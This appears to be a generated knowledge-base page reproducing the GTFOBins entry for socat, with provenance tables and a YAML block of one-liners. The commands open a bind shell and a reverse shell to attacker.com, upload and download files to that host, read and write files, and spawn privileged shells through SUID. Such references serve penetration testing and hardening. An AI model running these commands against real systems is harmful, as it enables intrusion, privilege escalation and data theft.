---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# socat

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `socat` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [socat](../../tools/linux/socat.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | socat |
| name | socat |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/socat/ |

## Preserved Source Material

```yaml
_body: ''
_name: socat
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat
functions:
  bind-shell:
  - code: socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
    connector: tcp-client-tty
    contexts:
      sudo: null
      suid:
        code: socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
        shell: false
      unprivileged: null
  download:
  - code: socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: tcp-server
  file-read:
  - code: socat -u file:/path/to/input-file -
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: socat -u 'exec:echo DATA' open:/path/to/output-file,creat
    comment: The `echo` command is actually used.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  reverse-shell:
  - code: socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
    contexts:
      sudo: null
      suid:
        code: socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
        shell: false
      unprivileged: null
    listener: tcp-server-tty
  shell:
  - code: socat - exec:/bin/sh,pty,ctty,raw,echo=0
    contexts:
      sudo: null
      suid:
        code: socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
        shell: false
      unprivileged: null
  upload:
  - code: socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tcp-server
```
